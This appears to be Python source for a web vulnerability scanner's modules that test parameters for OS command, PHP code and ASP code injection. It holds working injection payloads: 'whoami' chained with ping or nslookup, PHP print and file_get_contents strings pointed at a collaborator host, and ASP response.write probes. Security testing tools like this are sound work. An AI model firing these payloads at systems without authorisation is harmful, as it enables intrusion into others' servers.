
import re, random
from core.scanner.module import *

class OsCommandInjection(ParamsScanner):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "Os Command Injection",
        "Description": 'The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.',
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/78.html"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)


    def GetPayloads(self) -> list:
        collaborator = self.options.get('collaborator')
        commands = ["whoami;ping -c1 localhost","whoami&&ping -c1 localhost"]

        if collaborator:
            commands.append("whoami&&nslookup " + urlparse(collaborator).netloc)

        return commands

    
    def is_vulnerable(self, response) -> Status:
        return Status.Vulnerable if bool(re.findall("icmp|64 bytes from|min/avg/max/mdev", response.text, re.I)) else Status.NotVulnerable


class PHPCodeInjection(ParamsScanner):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "PHP Code Injection",
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/94.html"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)


    def GetPayloads(self) -> list:
        collaborator = self.options.get('collaborator')
        commands = [";${@print(md5(RCEB00M))};",";${@print(md5(\"RCEB00M\"))};"]

        if collaborator:
            host = urlparse(collaborator).netloc
            commands.append(";${@file_get_contents(\"http://{0}\")};".format(host))

        return commands
    
    def is_vulnerable(self,  response) -> Status:
        return Status.Vulnerable if "d091985aa0f4e2a2936490e2b978e057" in response.text else Status.NotVulnerable


class ASPCodeInjection(ParamsScanner):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "ASP Code Injection",
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/94.html"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)

        self.__rock_msg = "WRock" + str( random.randint(1111, 9999) )

    def GetPayloads(self) -> list:
        return [
            f"response.write({self.__rock_msg})",
            f"'+response.write({self.__rock_msg})+'",
            f"\"+response.write({self.__rock_msg})+\""
        ]

    def is_vulnerable(self, response) -> Status:
        return Status.Vulnerable if self.__rock_msg in response.text and all([p not in response.text for p in self.GetPayloads()]) else Status.NotVulnerable
